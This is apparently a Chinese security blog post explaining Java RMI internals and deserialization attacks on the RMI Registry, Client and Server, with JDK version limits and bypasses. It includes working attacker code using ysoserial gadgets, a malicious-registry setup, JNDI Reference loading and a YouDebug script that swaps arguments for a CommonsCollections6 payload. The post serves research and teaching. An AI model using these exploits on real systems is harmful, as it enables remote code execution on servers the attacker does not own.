---
typora-root-url: ../../../static
title: "Attack RMI"
date: 2021-07-04T17:07:36+08:00
draft: false
categories: ["security"]
---

## 基本概念

### RMI介绍

RMI（Remote Method Invocation）即远程方法调用。使用RMI可以在客户机上调用远程服务器上的对象。**RMI是一种行为，指的是Java远程方法调用，RMI不是一种协议** 。

### JRMP协议介绍

JRMP（Java Remote Method Protocol）即Java远程方法协议。它是**一种运行在Java远程方法调用（RMI）之下，在TCP/IP之上的线路层协议（Wire Protocol）** 。

也就是：**JRMP是一个协议，是用于RMI过程中的协议** 。

## RMI架构

首先RMI分为三种角色：Client客户端、Server服务端、Registry注册中心。很多时候，可能存在这种情况：Registry和Server在同一个JVM内。但是其实这三者是可以分开的。架构图如下所示：

![][p1]

RMI提出了Stub（客户端存根）和Skeleton（服务端骨架）两个概念，客户端和服务端之间的通信是基于Stub和Skeleton进行的。RMI的整体调用时序图如下图所示：

![][p2]

说明如下：

1. Server服务端创建ServiceImpl远程对象，因为ServiceImpl继承自UnicastRemoteObject，所以在创建这个远程对象的时候，会随机绑定一个端口用于监听客户端的请求。
2. 将创建的ServiceImpl远程对象注册到注册中心。
3. Client客户端向Registry注册中心查询远程对象。
4. Registry注册中心返回ServiceImpl_stub（远程对象存根）给Client客户端。
5. Client客户端通过ServiceImpl_stub请求调用service方法。
6. ServiceImpl_stub存根和ServiceImpl_skel服务端骨架通信。
7. ServiceImpl_skel调用ServiceImpl的service方法。
8. ServiceImpl_skel将函数调用返回结果返回给ServiceImpl_stub。
9. ServiceImpl_stub再将结果返回给Client客户端。

## 攻击路线

整个RMI过程中，存在三个实体：Client、Registry和Server。所以每个实体都是可以被攻击的，所以接下来以被攻击对象作为分类进行分析。以下分析的过程都是基于JDK1.8.0_66（JDK8u121开始加入RMI反序列化白名单，JDK8u191开始存在JEP 290，加入了反序列化过滤），后面再分析怎么绕过这些限制。

### 攻击Registry

首先说明一下存在如下攻击方式：

1. JDK Version < JDK8u121时，调用RegistryImpl_Stub#bind()等方法，直接传递一个恶意序列化对象进行攻击；
2. JDK8u121 <= JDK Version < JDK8u231时，使用JRMP Gadget即可绕过JDK的白名单限制；
3. JDK8u231 <= JDK Version < JDK8u241时，使用UnicastRemoteObject Gadget可绕过继续绕过；

我们可以使用如下代码创建一个单纯的RMI Registry：

```java
import java.rmi.registry.LocateRegistry;
import java.util.concurrent.CountDownLatch;
/**
 * @author : p1n93r
 * @date : 2021/7/29 18:30
 * 模拟脆弱的RMI Registry服务
 */
public class WeakRegistry {
    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);
        new CountDownLatch(1).await();
    }
}
```

简单的一行代码，就可以启动RMI Registry了，此处需要注意，Registry本身也是一个服务，其数据结构如下：

![][p3]

而我们通过如下代码获取的Registry其实就是一个RegistryImpl_Stub对象，和上面分析的RegistryImpl_Skel进行通信：

```java
Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
```

![][p4]

首先清楚一个概念：Skel是在服务端的，Stub是在客户端的，客户端通过Stub访问远端的Skel进行远程调用。并且需要注意，RegistryImpl_Stub是在本地创建的，不是远端传过来的。但是ServiceImpl_Stub是从Registry传过来的。如下所示，是本地创建RegistryImpl_Stub的代码：

```java
public static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) {
    LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                    new TCPEndpoint(host, port, csf, null), false);
    RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);
    return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
}
```

我们先看到远端Registry中RegistryImpl_Skel#dispatch方法：

```java
public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall call, int opnum, long hash)
        throws java.lang.Exception {
    if (hash != interfaceHash)
        throw new java.rmi.server.SkeletonMismatchException("interface hash mismatch");

    sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj;
    switch (opnum) {
        case 0: // bind(String, Remote)
        {
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.bind");

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.bind($param_String_1, $param_Remote_2);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 1: // list()
        {
            call.releaseInputStream();
            java.lang.String[] $result = server.list();
            try {
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 2: // lookup(String)
        {
            java.lang.String $param_String_1;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
            } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            java.rmi.Remote $result = server.lookup($param_String_1);
            try {
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 3: // rebind(String, Remote)
        {
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.rebind");

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.rebind($param_String_1, $param_Remote_2);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 4: // unbind(String)
        {
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.unbind");

            java.lang.String $param_String_1;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
            } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.unbind($param_String_1);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        default:
            throw new java.rmi.UnmarshalException("invalid method number");
    }
}
```

从代码中可以看出，Server可以调用Registry对外暴露的以下方法：

- bind(String, Remote)
- list()
- lookup()
- rebind(String, Remote)
- unbind(String)

也就是说：Server可以通过Registry_Stub类对象来调用以上方法，且从RegistryImpl_Skel#dispatch方法的代码中也可以看到，RegistryImpl_Skel在调用RegistryImpl之前会对传递过来的参数进行反序列化。例如我们看到case 0的操作：

```java
case 0: // bind(String, Remote)
{
    // Check access before reading the arguments
    RegistryImpl.checkAccess("Registry.bind");

    java.lang.String $param_String_1;
    java.rmi.Remote $param_Remote_2;
    try {
        java.io.ObjectInput in = call.getInputStream();
        $param_String_1 = (java.lang.String) in.readObject();
        $param_Remote_2 = (java.rmi.Remote) in.readObject();
    } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
        throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
    } finally {
        call.releaseInputStream();
    }
    server.bind($param_String_1, $param_Remote_2);
    try {
        call.getResultStream(true);
    } catch (java.io.IOException e) {
        throw new java.rmi.MarshalException("error marshalling return", e);
    }
    break;
}
```

这个就代表：Server通过RegistryImpl_Stub调用 `bind(String, Remote)` 方法时，Registry端的RegistryImpl_Skel对应的处理。（这也体现了RMI调用过程，其实是Stub和Skel的通信）。定位到：

```java
$param_String_1 = (java.lang.String) in.readObject();
$param_Remote_2 = (java.rmi.Remote) in.readObject();
```

可以看出，就是对Server中调用RegistryImpl_Skel#bind(String, Remote)方法传递过来的字符串和Remote对象进行反序列化操作。很明显，这就是一个攻击点：攻击者伪造成Server，通过调用RegistryImpl_Skel#bind(String, Remote)，传递一个恶意的序列化对象，Registry进行反序列化时即会造成RCE（当然，Registry得存在Gadget）。

例如如下代码，我伪造一个Server，向Registry发送一个恶意的Remote对象，这个对象其实就是ysoserial中的CC3（靶机需要JDK<=8u66才能打），通过动态代理将CC3 Payload代理成Remote类型对象，然后发送给Registry：

```java
/**
 * @author : p1n93r
 * @date : 2021/7/29 18:38
 * 模拟攻击方
 */
public class Attaker {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Object cmd = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) CC3.getPayload("calc"));
        Remote remote = Remote.class.cast(cmd);
        registry.bind("hackYou", remote);
    }
}
```

Registry成功反序列化，并且RCE：

![][p5]

根据Registry返回的报错信息也可以看到，是因为RegistryImpl_Skel#dispatch中进行了反序列化导致的RCE。

现在理清一下思路，攻击Registry，只需要观察RegistryImpl_Skel#dispatch方法的几个case，看下哪个case里面存在readObject反序列化操作。我们看到case 0（bind(String, Remote)）和case 3（rebind(String, Remote)）中存在 `(java.rmi.Remote) in.readObject();` 进行反序列化。但是其他case中，却只有 `(java.lang.String) in.readObject();` 反序列化。

前面我们演示过程中，攻击者传递的是一个恶意的Remote类型对象，在case 0的时候调用了 `(java.rmi.Remote) in.readObject();` 反序列化达到RCE。但是其实理论上，只有有readObject，就都能进行反序列化RCE，现在问题是：攻击者通过RegistryImpl_Stub调用的各个方法（bind()、unbind()、rebind()等），都有参数类型限制，比如bind方法，就限制形参类型为：String和Remote。我们无法直接使用这些方法传递任意类型的恶意序列化对象，例如下面所示，我试图传递一个Object类型的对象，但是参数类型不符合，导致编译不通过，无法发送：

![][p6]

但是因为发送端是我们攻击者完全可控的，我们其实可以绕~通过重写bind()函数等方式控制发送其他任意类型的序列化数据，达到Attack Registry的目的（当然，还有很多其他方式可以发送任意类型对象）。

现在再分析当JDK>=8u121时的情况。我们把JDK的版本调到8u211，再次启动攻击，发现Registry返回如下错误提示：

![][p7]

这是因为JDK8u121的时候，加入了反序列化白名单，我们Debug到RegistryImpl#registryFilter函数，即可看到有白名单限制：

![][p8]

这时候，ysoserial中就横空出世一个JRMPClient的Gadget：

```java
ObjID id = new ObjID(new Random().nextInt()); // RMI registry
TCPEndpoint te = new TCPEndpoint(host, port);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
```

并且这个类（及其父类）在白名单内，是可以被Registry反序列化的。那么这个Gadget的触发点在哪里呢？以下是被攻击的Registry的调用栈：

![][p9]

整个过程其实就是：被攻击的Registry反序列化JRMP Gadget后会与攻击者的RMI Registry连接上，执行分布式GC（调用了GCImpl_Stub#dirty可体现出），并且攻击者的RMI Registry会发送恶意的反序列化对象给Registry靶机，最终造成反序列化漏洞。

总而言之，**JRMP Gadget主要是在DGC层造成了一个反序列化，但是这个漏洞在JDK8u231进行了修复** 。也就是如果小于JDK<8u231，是可以用JRMP Gadget攻击任何RMI实体的（Client、Registry、Server）。但是后续 **存在 `UnicastRemoteObject Gadget` 可以继续绕过JDK8u231的修复，在JDK8u241再次进行了修复** 。

### 攻击Client

对于攻击方式，当Client使用 `InitialContext#lookup()` 来进行RMI调用的话，还可以在攻击机的Registry中使用 `Refererence Gadget` 来攻击Client。也就是说，存在如下攻击方式（以下分析基于JDK8u66）：

1. Client调用RegistryImpl_Stub#lookup()等方法，反序列化攻击者的Registry返回的恶意序列化对象，造成攻击，需要靶机有Gadget；
2. JDK Version < JDK8u121时，Client使用 `InitialContext#lookup()` 方式来进行RMI调用，此时可以使用 `Refererence Gadget` 来攻击Client，无需靶机存在反序列化Gadget。JDK8u121之后添加了trustURLCodebase限制，RMI下无法使用此方式进行攻击；
3.  JDK8u121 <= JDK Version <= JDK8u191时，Client使用 `InitialContext#lookup()` 方式来进行Ldap调用，此时可以使用 `Refererence Gadget` 来攻击Client，无需靶机存在反序列化Gadget。

首先分析第一种方式，这种 **要求使用非JNDI方式的rmi请求** 。因为现在攻击的是Client，所以我们看到RegistryImpl_Stub#lookup()方法的源码：

```java
// implementation of lookup(String)
public java.rmi.Remote lookup(java.lang.String $param_String_1)
        throws java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException {
    try {
        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) this, operations, 2, interfaceHash);
        try {
            java.io.ObjectOutput out = call.getOutputStream();
            out.writeObject($param_String_1);
        } catch (java.io.IOException e) {
            throw new java.rmi.MarshalException("error marshalling arguments", e);
        }
        ref.invoke(call);
        java.rmi.Remote $result;
        try {
            java.io.ObjectInput in = call.getInputStream();
            $result = (java.rmi.Remote) in.readObject();
        } catch (java.io.IOException e) {
            throw new java.rmi.UnmarshalException("error unmarshalling return", e);
        } catch (java.lang.ClassNotFoundException e) {
            throw new java.rmi.UnmarshalException("error unmarshalling return", e);
        } finally {
            ref.done(call);
        }
        return $result;
    } catch (java.lang.RuntimeException e) {
        throw e;
    } catch (java.rmi.RemoteException e) {
        throw e;
    } catch (java.rmi.NotBoundException e) {
        throw e;
    } catch (java.lang.Exception e) {
        throw new java.rmi.UnexpectedException("undeclared checked exception", e);
    }
}
```

可以看到lookup()方法中 `$result = (java.rmi.Remote) in.readObject()` ，会对Registry返回的数据进行反序列化，，如果我们可以控制Client的lookup()的Registry的地址，那么我们就可以伪造一个恶意的Registry，返回一个恶意的序列化对象让Client反序列化造成攻击；

Client请求Registry进行lookup操作，那我们再看看Registry中的RegistryImpl_Skel#dispatch中的lookup处理代码：

```java
case 2: // lookup(String)
{
    java.lang.String $param_String_1;
    try {
        java.io.ObjectInput in = call.getInputStream();
        $param_String_1 = (java.lang.String) in.readObject();
    } catch (java.io.IOException | java.lang.ClassNotFoundException e) {
        throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
    } finally {
        call.releaseInputStream();
    }
    java.rmi.Remote $result = server.lookup($param_String_1);
    try {
        java.io.ObjectOutput out = call.getResultStream(true);
        out.writeObject($result);
    } catch (java.io.IOException e) {
        throw new java.rmi.MarshalException("error marshalling return", e);
    }
    break;
}
```

可以看到，首先是反序列化Client传过来的序列化数据（ `$param_String_1 = (java.lang.String) in.readObject()` ），然后通过 `out.writeObject($result)` 序列化一个对象传给Client，这个对象从Server端，前面分析过，Client会进行反序列化，从而被R。所以可以看到，Registry也对Client传过来的数据进行了反序列化，所以理论上，Client通过lookup操作也可以攻击Registry，但是前面也分析过了，`RegistryImpl_Stub#lookup()` 只支持String类型的形参，所以没办法直接传任意类型的数据给Registry，但是可以绕。

例如如下方式，假设其是一个可被攻击者控制Registry地址的脆弱Client：

```java
/**
 * 基于传统方式的RMI
 */
public static void traditionalRmi()throws Exception{
    String name="Hack";
    Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
    registry.lookup(name);
}
```

攻击者伪造的恶意Registry如下所示：

```java
public static void main(String[] args) throws Exception{
    String name="Hack";
    Registry registry = LocateRegistry.createRegistry(1099);
    registry.bind(name, cc2Gadget());
    new CountDownLatch(1).await();
}
```

Client发起请求后，将会反序列化攻击者Registry构造的恶意序列化对象。效果如下：

![][p10]

可能有的人会发出疑问？不是说Registry的bind操作会造成反序列化嘛，为啥上面的 `registry.bind(name, cc2Gadget())` 没反序列化？

前面说过，Client或者Server端通过 `LocateRegistry#getRegistry()` 获取到的实际上是 `RegistryImpl_Stub` 类型对象，用于和注册中心的 `RegistryImpl_Skel`  进行通信，反序列化的点就发生在注册中心的 `RegistryImpl_Skel#bind()` 中。

而注册中心通过 `LocateRegistry.createRegistry()` 获取的实际上是 `RegistryImpl` 类型对象，所以上面调用的其实是 `RegistryImpl#bind()` 方法，这个方法里不进行反序列化操作，所以直接在注册中心进行bind操作不会进行反序列化。

如果Client不是使用传统的RMI方式（ `RegistryImpl_Stub#lookup()` ）来进行RMI调用的，而是使用JNDI的方式（ `InitialContext#lookup()` 方式）来进行RMI调用的，那么就可以使用 `Refererence Gadget` 来进行攻击，此种攻击方式无需Client存在Gadget即可造成RCE；

例如如下方式就是使用基于JNDI的RMI请求（测试版本：JDK8u20）：

```java
/**
 * 使用JNDI方式的RMI
 */
public static void rmiUnderJndi()throws Exception {
    String jndiUrl="rmi://127.0.0.1:1099/Hack";
    InitialContext initialContext = new InitialContext();
    initialContext.lookup(jndiUrl);
}
```

我们首先看到Gadget Chain：

![image-20210806145754723](/media/image-20210806145754723.png)

我们首先看到 `RegistryContext#lookup()` ：

![image-20210806150634154](/media/image-20210806150634154.png)

 然后继续看到 `NamingManager#getObjectInstance()` ：

![image-20210806154050044](/media/image-20210806154050044.png)

其实看到这里，意思就很明显了，从Refererence（远程）中获取一个ObjectFactory。问题就出现在这个 `NamingManager#getObjectFactoryFromReference()` 中：

![image-20210806154516887](/media/image-20210806154516887.png)

最终会在 `VersionHelper12#loadClass()` 中调用如下方法加载远程的Class， **并且执行类初始化** ：

```java
Class<?> loadClass(String className, ClassLoader cl)
    throws ClassNotFoundException {
    // 第二个参数为true代表执行类初始化
    // 所以恶意代码写在静态初始化块内就能在此处进行执行了
    Class<?> cls = Class.forName(className, true, cl);
    return cls;
}
```

可以看到这个地方是直接加载字节码到内存，并且执行类初始化，我们将恶意代码写在静态初始化块中，此处就会执行。不需要Client存在任何Gadget，非常优美~

JDK8u121的时候， `com.sun.jndi.rmi.object.trustURLCodebase` 默认为false，rmi不能从远程加载了，所以基于RMI的JNDI没法打了。但是 `JDK8u121 <= JDK Version <= JDK8u191` 时，使用Ldap的JNDI仍然可以打，因为这个版本区间内， `com.sun.jndi.ldap.object.trustURLCodebase` 默认为true。

我们首先看到Gadget Chain：

![image-20210806165112054](/media/image-20210806165112054.png)

可以看到，和RMI的攻击方式差不多，都是利用Reference从远程加载类，并且执行类初始化。

### 攻击Server

注意，此处分析的是攻击Server端，不要和Registry弄混淆了。有的demo代码中，Registry和Service放在一起，容易弄混淆攻击对象。

攻击Server存在如下攻击方式：

- JDK Version < JDK8u242时，只需要找到Service接口中，存在String（或者其他任意非基本参数类型）、Object或者Serializable类型的形参的方法，我们通过Client调用这个接口方法，传递恶意序列化对象作为形参，Server端会调用 `readObject()` 进行反序列化，由此被攻击。
- JDK Version > JDK8u242时，类型为String类型的形参对应的接口方法不能再被反序列化攻击了。但是Object和Serializable类型还可以用。

首先准备好demo：

以下是Registry的代码（不分析攻击Registry）：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/7 18:14
 * 模拟RMI注册中心
 */
public class HelloRegistry {
    public static void main(String[] args)throws Exception {
        LocateRegistry.createRegistry(1099);
        new CountDownLatch(1).await();
    }
}
```

以下是Service的定义和实现代码：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/6 18:31
 * Service接口
 */
public interface HelloService extends Remote {
    void sayHello(String str) throws RemoteException;
    void poke(Object object) throws RemoteException;
}
```

```java
/**
 * @author : p1n93r
 * @date : 2021/8/6 18:32
 * Service实现
 */
public class HelloServiceImpl extends UnicastRemoteObject implements HelloService {
    protected HelloServiceImpl() throws RemoteException { }

    @Override
    public void sayHello(String str) throws RemoteException {
        System.out.println("Server received str:"+str);
    }

    @Override
    public void poke(Object object) throws RemoteException {
        System.out.println("Server received object:"+object);
    }
}
```

以下是向注册中心注册一个HelloService服务：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/6 18:29
 * 模拟脆弱的服务端
 */
public class WeakServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        HelloServiceImpl helloService = new HelloServiceImpl();
        // Bind a service to the registry
        registry.bind("hello",helloService);
        System.out.println("RMI server is ready");
    }
}
```

在讲攻击之前，先讲攻击原理。为啥调用Server端的形参含有Object、Serializable以及String类型的接口方法，可以造成Server端反序列化攻击呢？首先看到Server端的 `sun.rmi.server.UnicastServerRef#dispatch()` 代码片段（JDK8u20）：

```java
// unmarshal parameters
Class<?>[] types = method.getParameterTypes();
Object[] params = new Object[types.length];

try {
    unmarshalCustomCallData(in);
    // Unmarshal the parameters
    for (int i = 0; i < types.length; i++) {
        params[i] = unmarshalValue(types[i], in);
    }
```

可以看到，逻辑就是：获取Client端发送的参数类型，然后调用 `unmarshalValue()` 方法反序列化Client传递过来的参数值。我们继续跟进 `unmarshalValue()` 方法：

```java
protected static Object unmarshalValue(Class<?> type, ObjectInput in)
    throws IOException, ClassNotFoundException
{
    if (type.isPrimitive()) {
        if (type == int.class) {
            return Integer.valueOf(in.readInt());
        } else if (type == boolean.class) {
            return Boolean.valueOf(in.readBoolean());
        } else if (type == byte.class) {
            return Byte.valueOf(in.readByte());
        } else if (type == char.class) {
            return Character.valueOf(in.readChar());
        } else if (type == short.class) {
            return Short.valueOf(in.readShort());
        } else if (type == long.class) {
            return Long.valueOf(in.readLong());
        } else if (type == float.class) {
            return Float.valueOf(in.readFloat());
        } else if (type == double.class) {
            return Double.valueOf(in.readDouble());
        } else {
            throw new Error("Unrecognized primitive type: " + type);
        }
    } else {
        return in.readObject();
    }
}
```

可以看到，逻辑为：如果参数类型不是基本数据类型（isPrimitive）,就直接调用 `readObject()` 进行反序列化，由此造成攻击。

同时我们知道，String类型不是Java的基本参数类型，所以也会调用 `readObject()` 进行反序列化。

现在开始讲攻击手法：

对于参数类型为Object、Serializable类型的参数，直接调用接口的方法传递恶意序列化数据就行了。如下所示，攻击者首先从Registry获取Server中bind的ServiceStub，然后调用其poke方法，传递一个恶意的序列化对象，造成Server端RCE：

```java
/**
 * @author : p1n93r
 * @date : 2021/8/6 18:45
 */
public class Attack {
    public static void main(String[] args)throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        HelloService hello = (HelloService)registry.lookup("hello");
        hello.poke(CC6.getPayload());
    }
}
```

![image-20210807203321837](/media/image-20210807203321837.png)

对于非基本参数类型的形参（常见的就是String类型），我们如何进行攻击呢？

我们攻击者作为Client，可以随意修改Client达到发送任意类型的数据给Server进行反序列化的目的。存在如下几个常见的手法：

- 复制 `java.rmi` 包下的代码，并且修改里面的代码从而使得支持发送任意类型的数据；
- 通过debug模式，在对象被序列化之前，替换对象为恶意的对象；
- 使用 `javassist` 修改发送数据的代码；
- 直接修改网络数据流，将恶意序列化数据注入；

这里比较方便和友好的操作就是使用第二种方式。并且还有一个很友好的工具提供给我们使用：[YouDebug](http://youdebug.kohsuke.org/user-guide.html)

当我们Client进行RMI调用的时候，底层是通过 `java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod()` 来发送数据给远程Server的，首先看到代码：

```java
private Object invokeRemoteMethod(Object proxy,
                                  Method method,
                                  Object[] args)
    throws Exception
{
    try {
        if (!(proxy instanceof Remote)) {
            throw new IllegalArgumentException(
                "proxy not Remote instance");
        }
        return ref.invoke((Remote) proxy, method, args,
                          getMethodHash(method));
    } catch (Exception e) {
        if (!(e instanceof RuntimeException)) {
            Class<?> cl = proxy.getClass();
            try {
                method = cl.getMethod(method.getName(),
                                      method.getParameterTypes());
            } catch (NoSuchMethodException nsme) {
                throw (IllegalArgumentException)
                    new IllegalArgumentException().initCause(nsme);
            }
            Class<?> thrownType = e.getClass();
            for (Class<?> declaredType : method.getExceptionTypes()) {
                if (declaredType.isAssignableFrom(thrownType)) {
                    throw e;
                }
            }
            e = new UnexpectedException("unexpected exception", e);
        }
        throw e;
    }
}
```

可以看到这个方法的逻辑，顾名思义就是调用远程方法，且第三个参数args，是一个数组，代表了调用的远程方法的参数值列表，所以我们可以通过YouDebug这个工具来hook这个方法，将传递的参数值修改为恶意的对象，Server端接收到后进行反序列化就会被攻击。

接下来介绍怎么通过使用YouDebug将String类型的参数值，修改成CC6 payload。

首先创建一个hack.groovy：

```groovy
// YouDebug不支持传递参数值到脚本中
// 你可以在这里修改你需要的一些参数
def payloadName = "CommonsCollections6";
def payloadCommand = "calc";
// 这个代表你传递的String类型的参数值，待会hook到后将进行匹配判断，防止修改错参数
def needle = "p1n93r"
println "Loaded..."
// 在invokeRemoteMethod方法上设置断点，查找传递过来的String类型的参数值
// 在找到的参数值内匹配needle参数值，如果匹配到，则将其替换成反序列化payload
vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {
  println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"
  // 注意：pyload class需要被YouDebug加载到
  vm.loadClass("ysoserial.payloads." + payloadName);
  // 获取方法的第三个参数值，也就是args
  delegate."@2".eachWithIndex { arg,idx ->
     println "[+] Argument " + idx + ": " + arg[0].toString();
     if(arg[0].toString().contains(needle)) {
        println "[+] Needle " + needle + " found, replacing String with payload" 
        // 准备创建payload
        def payload = vm._new("ysoserial.payloads." + payloadName);
        def payloadObject = payload.getObject(payloadCommand)
        vm.ref("java.lang.reflect.Array").set(delegate."@2",idx, payloadObject);
        println "[+] Done.."
     }
  }
}
```

编写如下Client代码，调用Server的sayHello方法，传递的是一个String类型对象，后续通过YouDebug动态修改这个参数值为CC6 payload：

```java
public class Attack {
    public static void main(String[] args)throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        HelloService hello = (HelloService)registry.lookup("hello");
        hello.sayHello("p1n93r");
    }
}
```

然后使用如下参数启动你的Client：

```java
Java -agentlib:jdwp=transport=dt_socket,server=y,address=127.0.0.1:8000
```

如下所示：

![image-20210808003434017](/media/image-20210808003434017.png)

最后启动YouDebug：

```bash
java -jar youdebug-1.5.jar -socket 127.0.0.1:8000 hack.groovy
```

如下图所示：

![image-20210808003846721](/media/image-20210808003846721.png)

在Server端打断点，发现收到请求，准备进行调用readObject进行反序列化（type仍然为String，但是反序列化出来的对象不是String类型）：

![image-20210808010337762](/media/image-20210808010337762.png)

Client收到Server端返回的错误信息（虽然提示mismatch，但是早就反序列化RCE了）：

![image-20210808010644037](/media/image-20210808010644037.png)

## 外部参考

- [https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1](https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1)
- [https://threedr3am.github.io/2020/03/03/%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI-%E7%BB%88%E7%BB%93%E7%AF%87/](https://threedr3am.github.io/2020/03/03/%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI-%E7%BB%88%E7%BB%93%E7%AF%87/)
- [https://threedr3am.github.io/2020/01/15/%E5%9F%BA%E4%BA%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20-%20%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI/](https://threedr3am.github.io/2020/01/15/%E5%9F%BA%E4%BA%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20-%20%E6%90%9E%E6%87%82RMI%E3%80%81JRMP%E3%80%81JNDI/)
- [https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)

[p1]:/media/2021-07-29-1.png
[p2]:/media/2021-07-29-2.png
[p3]:/media/2021-07-29-3.png
[p4]:/media/2021-07-29-4.png
[p5]:/media/2021-07-29-5.png
[p6]:/media/2021-07-29-6.png
[p7]:/media/2021-07-29-7.png
[p8]:/media/2021-07-29-8.png
[p9]:/media/2021-07-29-9.png
[p10]:/media/2021-07-29-10.png